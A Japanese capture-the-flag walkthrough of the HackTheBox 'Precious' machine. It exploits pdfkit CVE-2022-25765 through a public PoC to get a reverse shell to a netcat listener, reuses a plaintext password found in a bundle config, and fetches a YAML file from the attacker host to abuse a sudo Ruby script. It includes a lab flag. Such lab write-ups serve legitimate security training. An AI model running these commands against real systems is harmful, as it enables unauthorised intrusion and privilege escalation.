## STEP 1
```sh
└─$ rustscan -a 10.129.228.98 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.228.98:22
Open 10.129.228.98:80
10.129.228.98 -> [22,80]
```


## STEP 2
80番にアクセス、「precious.htb」にリダイレクトされたので名前解決できない  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_01.png" width="50%" height="50%">  
hostsを編集
```sh
└─$ echo '10.129.228.98 precious.htb' | sudo tee -a /etc/hosts
```
アクセスできた、urlを入力できるっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_02.png" width="50%" height="50%">  
試しに「hxxp://127.0.0.1」を入力したらエラーが出た  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_03.png" width="50%" height="50%">  
今度はkaliでpythonでwebサーバをたてて確認させる
```sh
└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
pdfが自動でダウンロードされた、実際にkaliでたてたwebサーバのキャプチャになっている  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Precious_04.png" width="75%" height="75%">  
ダウンロードされたpdfの情報を確認すると、pdfkitで作成されているっぽい
```sh
└─$ exiftool Downloads/muzjrzs750ms8sopaxtjok1iojlb19li.pdf 
ExifTool Version Number         : 13.25
File Name                       : muzjrzs750ms8sopaxtjok1iojlb19li.pdf
Directory                       : Downloads
File Size                       : 38 kB
File Modification Date/Time     : 2025:07:02 08:40:05-04:00
File Access Date/Time           : 2025:07:02 08:40:05-04:00
File Inode Change Date/Time     : 2025:07:02 08:40:05-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Generated by pdfkit v0.8.6
```
pdfkit v8.0.6 には、CVE-2022-25765のrceの脆弱性があるらしい  
[PoC](https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765)でエクスプロイト
```sh
└─$ wget https://raw.githubusercontent.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765/refs/heads/main/CVE-2022-25765.py
--2025-07-02 08:53:48--  https://raw.githubusercontent.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765/refs/heads/main/CVE-2022-25765.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1582 (1.5K) [text/plain]
Saving to: ‘CVE-2022-25765.py’

CVE-2022-25765.py                                          100%[========================================================================================================================================>]   1.54K  --.-KB/s    in 0s      

2025-07-02 08:53:49 (38.4 MB/s) - ‘CVE-2022-25765.py’ saved [1582/1582]


└─$ python3.13 CVE-2022-25765.py -t http://precious.htb -a 10.10.16.4 -p 4444
[*] Input target address is http://precious.htb
[*] Input address for reverse connect is 10.10.16.4
[*] Input port is 4444
[!] Run the shell... Press Ctrl+C after successful connection
^CTraceback (most recent call last):
```
リバースシェル取得！がユーザフラグすら権限拒否
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.228.98] 44794
bash: cannot set terminal process group (677): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ id
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)


ruby@precious:/var/www/pdfapp$ cat /home/henry/user.txt
cat /home/henry/user.txt
cat: /home/henry/user.txt: Permission denied
```


## STEP 3
謎のconfigファイルにhenryのパスワードらしいものを発見  
henryにログイン成功！ユーザフラグゲット！
```sh
ruby@precious:/var/www/pdfapp$ cat /home/ruby/.bundle/config
cat /home/ruby/.bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"


ruby@precious:/var/www/pdfapp$ su henry
su henry
Password: Q3c1AqGHtoI0aXAYFH


id
uid=1000(henry) gid=1000(henry) groups=1000(henry)


SHELL=/bin/bash script -q /dev/null
henry@precious:~$


henry@precious:~$ cat /home/henry/user.txt
cat /home/henry/user.txt
e3948152e2e4cd28f2c967ffcc412a53
```


## STEP 4
```sh
henry@precious:~$ sudo -l
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

```sh
henry@precious:~$ cd /home/henry
cd /home/henry


henry@precious:~$ wget http://10.10.16.4/dependencies.yml
wget http://10.10.16.4/dependencies.yml
--2025-07-02 10:08:12--  http://10.10.16.4/dependencies.yml
Connecting to 10.10.16.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 667 [application/yaml]
Saving to: ‘dependencies.yml’

     0K                                                       100%  119M=0s

2025-07-02 10:08:14 (119 MB/s) - ‘dependencies.yml’ saved [667/667]
```
